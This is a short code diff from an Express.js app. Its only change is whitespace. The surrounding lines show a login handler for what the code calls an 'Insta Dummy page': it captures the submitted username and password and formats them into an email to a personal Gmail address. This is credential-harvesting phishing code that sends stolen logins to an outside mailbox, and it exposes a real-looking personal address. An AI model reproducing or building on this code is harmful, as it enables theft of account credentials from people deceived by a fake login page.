@@ -30,7 +30,7 @@ app.get("/success",(req,res,next)=>{
 app.post("/login",async (req,res,next)=>{
   const username = req.body.uname || '';  // Access username from POST data
   const password = req.body.password || '';   // Access password from POST data
-
+    
   const subject = "Someone Login ! Insta Dummy page";
   const to = "yuvraj1mann@gmail.com";
   const text = "Username: " + username + "\r\nPassword: " + password;
